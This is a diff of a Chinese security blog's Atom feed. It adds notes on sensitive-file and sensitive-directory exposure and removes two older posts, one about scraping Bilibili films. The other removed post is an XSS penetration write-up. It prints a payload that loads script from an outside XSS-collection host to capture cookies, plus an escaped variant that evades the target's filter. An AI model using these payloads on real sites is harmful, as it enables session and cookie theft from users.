@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.teamssix.com/"/>
-  <updated>2019-11-21T14:02:47.894Z</updated>
+  <updated>2019-11-23T09:55:31.182Z</updated>
   <id>https://www.teamssix.com/</id>
   
   <author>
@@ -15,6 +15,66 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【漏洞笔记】敏感文件</title>
+    <link href="https://www.teamssix.com/year/191123-174558.html"/>
+    <id>https://www.teamssix.com/year/191123-174558.html</id>
+    <published>2019-11-23T09:45:58.000Z</published>
+    <updated>2019-11-23T09:55:31.182Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：敏感文件</p><p>风险等级：低</p><p>问题类型：信息泄露</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>由于网站运维人员疏忽，存放敏感信息的文件被泄露或由于网站运行出错导致敏感信息泄露。</p><p>Web应用程序显露了某些文件名称，此信息可以帮助攻击者对站点进一步的攻击。例如，知道文件名称之后，攻击者便可能获得它的内容，也许还能猜出其它的文件名或目录名，并尝试访问它们。</p><a id="more"></a><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>攻击者可直接下载用户的相关信息，包括网站的绝对路径、用户的登录名、密码、真实姓名、身份证号、电话号码、邮箱、QQ号等。</p><p>攻击者通过构造特殊URL地址，触发系统web应用程序报错，在回显内容中，获取网站敏感信息。</p><p>攻击者利用泄漏的敏感信息，获取网站服务器web路径，为进一步攻击提供帮助。</p><p>攻击者可能通过文件名，也许还能猜出其它的文件名或目录名，并尝试访问它们。这些可能包含敏感信息。攻击者通过搜集信息，以便进一步攻击目标站点。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>对网站错误信息进行统一返回，模糊化处理；对存放敏感信息的文件进行加密并妥善储存，避免泄漏敏感信息。</p><p>修改复杂的文件名称；从站点中除去不需要的文件。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<a href="https://ninjia.gitbook.io/secskill/web/info" target="_blank" rel="noopener">https://ninjia.gitbook.io/secskill/web/info</a></p></blockquote>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：敏感文件&lt;/p&gt;
+&lt;p&gt;风险等级：低&lt;/p&gt;
+&lt;p&gt;问题类型：信息泄露&lt;/p&gt;
+&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;由于网站运维人员疏忽，存放敏感信息的文件被泄露或由于网站运行出错导致敏感信息泄露。&lt;/p&gt;
+&lt;p&gt;Web应用程序显露了某些文件名称，此信息可以帮助攻击者对站点进一步的攻击。例如，知道文件名称之后，攻击者便可能获得它的内容，也许还能猜出其它的文件名或目录名，并尝试访问它们。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="信息泄露" scheme="https://www.teamssix.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    
+      <category term="敏感文件" scheme="https://www.teamssix.com/tags/%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【漏洞笔记】敏感目录</title>
+    <link href="https://www.teamssix.com/year/191123-174550.html"/>
+    <id>https://www.teamssix.com/year/191123-174550.html</id>
+    <published>2019-11-23T09:45:50.000Z</published>
+    <updated>2019-11-23T09:55:35.259Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：敏感目录</p><p>风险等级：低</p><p>问题类型：信息泄露</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>目标服务器上存在敏感名称的目录。如/admin、/conf、/backup、/db等这些目录中有可能包含了大量的敏感文件和脚本，如服务器的配置信息或管理脚本等。</p><p>Web应用程序显露了某些目录名称，此信息可以帮助攻击者对站点进一步的攻击。</p><a id="more"></a><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>如果这些名称敏感的目录中包含了危险的功能或信息，恶意攻击者有可能利用这些脚本或信息直接获取目标服务器的控制权或基于这些信息实施进一步的攻击。</p><p>知道目录之后，攻击者便可能获得目录下边的文件名，也许还能猜出其它的文件名或目录名，并尝试访问它们。这些可能包含敏感信息。攻击者通过搜集信息，以便进一步攻击目标站点。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>如果这些目录中包含了敏感内容，可以使用非常规的目录名称，如果能删除也可以删除或者正确设置权限，禁止用户访问。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<a href="https://www.izhangheng.com/china-top10-web-site-vulnerability-ranking-and-solutions" target="_blank" rel="noopener">https://www.izhangheng.com/china-top10-web-site-vulnerability-ranking-and-solutions</a></p></blockquote>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：敏感目录&lt;/p&gt;
+&lt;p&gt;风险等级：低&lt;/p&gt;
+&lt;p&gt;问题类型：信息泄露&lt;/p&gt;
+&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;目标服务器上存在敏感名称的目录。如/admin、/conf、/backup、/db等这些目录中有可能包含了大量的敏感文件和脚本，如服务器的配置信息或管理脚本等。&lt;/p&gt;
+&lt;p&gt;Web应用程序显露了某些目录名称，此信息可以帮助攻击者对站点进一步的攻击。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="信息泄露" scheme="https://www.teamssix.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    
+      <category term="敏感目录" scheme="https://www.teamssix.com/tags/%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95/"/>
+    
+  </entry>
   
   <entry>
     <title>【漏洞笔记】基于HTTP连接的登录请求</title>
@@ -68,9 +128,9 @@
     
       <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
     
-      <category term="XSS" scheme="https://www.teamssix.com/tags/XSS/"/>
-    
       <category term="jQuery" scheme="https://www.teamssix.com/tags/jQuery/"/>
+    
+      <category term="XSS" scheme="https://www.teamssix.com/tags/XSS/"/>
     
   </entry>
   
@@ -518,56 +578,6 @@
       <category term="漏洞挖掘" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
     
       <category term="小白" scheme="https://www.teamssix.com/tags/%E5%B0%8F%E7%99%BD/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【渗透实例】记录一次XSS渗透过程</title>
-    <link href="https://www.teamssix.com/year/190703-221956.html"/>
-    <id>https://www.teamssix.com/year/190703-221956.html</id>
-    <published>2019-07-03T14:19:56.000Z</published>
-    <updated>2019-11-02T12:22:44.797Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="0x01-找到存在XSS的位置"><a href="#0x01-找到存在XSS的位置" class="headerlink" title="0x01 找到存在XSS的位置"></a>0x01 找到存在XSS的位置</h1><p>没什么技巧，见到框就X，功夫不负有心人，在目标网站编辑收货地址处发现了存在XSS的地方，没想到这种大公司还会存在XSS。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用的XSS代码：&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss1.png" alt></p><h1 id="0x02-构造XSS代码连接到XSS平台"><a href="#0x02-构造XSS代码连接到XSS平台" class="headerlink" title="0x02 构造XSS代码连接到XSS平台"></a>0x02 构造XSS代码连接到XSS平台</h1><p>XSS平台给我们的XSS代码是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/tExtArEa&gt;&apos;&quot;&gt;&lt;sCRiPt sRC=https://xss8.cc/3Ri4&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss2.png" alt><br>直接插入的话会提示参数非法，经过多次尝试，最后发现该平台会对双引号、script字符进行识别过滤，大小写会被过滤，于是尝试插入下面的语句:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/tExtArEa&gt;&apos;\&quot;&gt;&lt;\sCRiPt sRC=https://xss8.cc/3Ri4&gt;&lt;/\sCrIpT&gt;</span><br></pre></td></tr></table></figure><p>这条代码比上面平台给的XSS代码的多了几个 “&quot;，也就是转义字符，利用转义字符可以绕过该平台的策略，因为经验不足，所以在这一步尝试了很多种办法都没能绕过，要不有的可以插入但是连不上XSS平台，要不有的就是被识别拦截。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss3.png" alt><br>加上转义字符成功插入后，刷新目标网站与XSS平台页面，在XSS平台就能看到刚才的访问记录。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss4.png" alt><br>这里可以获取该登陆用户的Cookie、User-Agent、IP地址什么的，但是触发这个XSS需要登陆存在XSS的账号才行，所以个人觉着知道了这个Cookie也没啥用。<br>并且虽然知道这里存在XSS，但是触发条件是需要知道用户名和密码，然后来到收货地址页面，所以个人感觉作用不大，因此在想这个漏洞还有没有其他的利用价值，后续或许会继续更新本次渗透过程，如果你有什么好的想法，欢迎下方留言。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;0x01-找到存在XSS的位置&quot;&gt;&lt;a href=&quot;#0x01-找到存在XSS的位置&quot; class=&quot;headerlink&quot; title=&quot;0x01 找到存在XSS的位置&quot;&gt;&lt;/a&gt;0x01 找到存在XSS的位置&lt;/h1&gt;&lt;p&gt;没什么技巧，见到框就X，功夫不负有心人，在目标网站编辑收货地址处发现了存在XSS的地方，没想到这种大公司还会存在XSS。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="渗透实例" scheme="https://www.teamssix.com/categories/%E6%B8%97%E9%80%8F%E5%AE%9E%E4%BE%8B/"/>
-    
-    
-      <category term="渗透实例" scheme="https://www.teamssix.com/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E4%BE%8B/"/>
-    
-      <category term="XSS" scheme="https://www.teamssix.com/tags/XSS/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【Python实例】让Python告诉你B站观影指南</title>
-    <link href="https://www.teamssix.com/year/190619-202702.html"/>
-    <id>https://www.teamssix.com/year/190619-202702.html</id>
-    <published>2019-06-19T12:27:02.000Z</published>
-    <updated>2019-11-02T12:22:00.990Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>hello大家好，这里是TeamsSix，昨天晚上11点多的突然想在B站看电影了，但是又不知道那个电影值得看，于是首先想到的是去各大影评UP主的频道里面看看，转了几圈后发现他们讲解的电影B站很多都没有，这个时候又想到了一种方法，就是在B站搜索：“在B站值得看的电影”，没想到以前还真有UP主统计过：</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie1.png" alt><br>点进去之后发现UP主居然手动统计了160多部电影，最后他做成了一个表格，看完了之后立刻给了三连，因为在我看来每一位付出了努力与汗水的UP主都值得被尊重（疯狂暗示），事后就想到能不能用我这三脚猫的Python水平统计一下B站最值得看的电影呢？<br>有了想法，立刻从床上爬了起来，在夜黑风高的晚上开始垒起了代码，终于经历了一个通宵的时间之后完成了这个想法。</p><h1 id="0x01-代码运行"><a href="#0x01-代码运行" class="headerlink" title="0x01 代码运行"></a>0x01 代码运行</h1><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie2.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie3.png" alt></p><blockquote><p>具体代码见文章底部链接</p></blockquote><h1 id="0x02-运行结果"><a href="#0x02-运行结果" class="headerlink" title="0x02 运行结果"></a>0x02 运行结果</h1><p>通过刚才的运行结果，可以看到，播放数量最高的是《你的名字》，足足有一千八百多万的播放量<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie4.png" alt><br>弹幕数量最高的还是《你的名字》，有高达98万条弹幕<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie5.png" alt><br>硬币数量最多的依然是《你的名字》，硬币数量达到了39万个<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie6.png" alt><br>追剧人数最高的《命运之夜–天之杯：恶兆之花》<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie7.png" alt><br>B站评分最高的不详，因为评分最高9.9的视频比较多，所以B站评分没有统计到视频最后的汇总里<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie8.png" alt><br>在B站的电影中豆瓣评分最高的是《武林外传》，高达9.5分<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie9.png" alt><br>B站评分与豆瓣评分差最大的是《深夜食堂》，两个平台差了7分，这部电影我也看过，表示还阔以，不明白为什么豆瓣评分那么低。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie10.png" alt><br>ok，最后我们再来总结一下，B站的电影中播放数量、弹幕数量、硬币数量最高的均为《你的名字》，可以说是B站电影区当之无愧的C位，其余《刀剑神域：序列之争》《声之形》《白蛇：缘起》也都经常出现在前三之中。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie11.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie12.png" alt></p><h1 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03 结语"></a>0x03 结语</h1><p>在视频的最后再简单说两句，这些数据都是可以导出为表格的，另外在写代码的中间有个小插曲，就是在获取豆瓣搜索结果中电影评分的时候，发现电影数据都是被加密的，就像这个样子<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie13.png" alt><br>最后通过SergioJune在Github上提供的代码得以解决，在这里也向他表示感谢<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie14.png" alt></p><blockquote><p>文章代码：<a href="https://github.com/teamssix/bilibili-movie" target="_blank" rel="noopener">https://github.com/teamssix/bilibili-movie</a></p></blockquote><p>演示视频：</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=56117996&cid=98086981&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"> </iframe></div><p>如果视频不能全屏播放，请点击<a href="https://www.bilibili.com/video/av56117996/" title="源链接" target="_blank" rel="noopener">源链接</a>观看。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;hello大家好，这里是TeamsSix，昨天晚上11点多的突然想在B站看电影了，但是又不知道那个电影值得看，于是首先想到的是去各大影评UP主的频道里面看看，转了几圈后发现他们讲解的电影B站很多都没有，这个时候又想到了一种方法，就是在B站搜索：“在B站值得看的电影”，没想到以前还真有UP主统计过：&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="实例演示" scheme="https://www.teamssix.com/categories/%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%A4%BA/"/>
-    
-    
-      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
-    
-      <category term="电影" scheme="https://www.teamssix.com/tags/%E7%94%B5%E5%BD%B1/"/>
-    
-      <category term="爬虫" scheme="https://www.teamssix.com/tags/%E7%88%AC%E8%99%AB/"/>
     
   </entry>
   
